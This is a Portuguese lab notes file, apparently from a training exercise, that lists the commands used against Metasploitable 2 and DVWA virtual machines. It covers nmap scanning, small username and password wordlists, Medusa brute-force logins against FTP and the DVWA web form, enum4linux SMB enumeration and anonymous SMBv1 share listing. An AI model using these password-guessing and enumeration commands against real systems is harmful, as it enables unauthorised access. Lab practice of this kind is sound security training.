# SCRIPTS E COMANDOS UTILIZADOS

Este arquivo reúne os principais comandos executados durante os testes de reconhecimento, enumeração e autenticação nos ambientes FTP, DVWA e SMB.

Todos os procedimentos foram realizados em máquinas virtuais destinadas exclusivamente ao laboratório.

---

## 1. METASPLOITABLE 2

Identificação do endereço IP da máquina alvo:

```bash
ip a
```

---

## 2. KALI LINUX

### 2.1 FTP

**Reconhecimento das portas e serviços:**

```bash
nmap -sV -p 21,22,80,445,139 192.168.x.x
```

**Criação da lista de usuários:**

```bash
echo -e 'users\nmsfadmin\nadmin\nroot' > users.txt
```

**Criação da lista de senhas:**

```bash
echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
```

**Teste de autenticação com Medusa:**

```bash
medusa -h 192.168.x.x -U users.txt -P pass.txt -M ftp -t 6
```

### 2.2 DVWA

**Teste automatizado de autenticação com Medusa:**

```bash
medusa -h 192.168.x.x -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&login=Login' \
  -m 'FAIL=Login failed' -t 6
```

**Observação:** Foram utilizadas as mesmas listas de usuários e senhas preparadas para o cenário FTP.

### 2.3 SMB

**Enumeração de informações:**

```bash
nmap -Pn -p 139,445 -sV --script smb-protocols 192.168.x.x

enum4linux -a 192.168.x.x | tee enum4_output.txt
```

**Criação da lista de usuários:**

```bash
echo -e 'user\nmsfadmin\nservice' > smb_users.txt
```

**Criação da lista de senhas:**

```bash
echo -e 'password\n123456\nWelcome123\nmsfadmin' > smb_pass.txt
```

**Listagem de compartilhamentos com autenticação:**

```bash
smbclient -L //192.168.x.x -U msfadmin
```

**Listagem de compartilhamentos com acesso anônimo e negociação SMBv1:**

```bash
smbclient -L //192.168.x.x -N \
  --option='client min protocol=NT1' \
  --option='client max protocol=NT1'
```

**Observação:** A especificação do protocolo NT1 foi utilizada para permitir a negociação com o servidor Metasploitable 2, que disponibiliza SMBv1.

---

## Observações gerais

- Os endereços IP foram anonimizados nesta documentação.
- As listas utilizadas são exemplos educacionais.
- Os testes devem ser executados exclusivamente em ambientes próprios ou autorizados.
- Os comandos devem ser adaptados conforme os endereços IP e as configurações das máquinas virtuais.